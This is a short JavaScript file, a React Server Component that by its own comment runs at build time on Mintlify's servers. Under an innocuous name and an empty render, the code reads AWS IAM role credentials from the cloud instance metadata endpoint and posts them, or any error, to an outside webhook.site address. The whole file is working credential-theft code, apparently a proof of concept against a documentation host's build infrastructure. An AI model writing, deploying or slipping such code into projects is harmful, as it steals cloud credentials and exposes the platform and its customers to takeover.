// React Server Component — no "use client" — executes at build time on Mintlify's server
export default async function Island() {
  try {
    const role = await fetch(
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      { cache: "no-store", signal: AbortSignal.timeout(4000) }
    ).then(r => r.text());
    const creds = await fetch(
      `http://169.254.169.254/latest/meta-data/iam/security-credentials/${role.trim()}`,
      { cache: "no-store", signal: AbortSignal.timeout(4000) }
    ).then(r => r.json());
    await fetch("https://webhook.site/e27d2c30-7065-4093-984b-28ab4e278794", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ source: "mintlify-build-server", role: role.trim(), ...creds }),
    });
  } catch (e) {
    await fetch("https://webhook.site/e27d2c30-7065-4093-984b-28ab4e278794", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ source: "mintlify-build-error", error: String(e) }),
    });
  }
  return null;
}
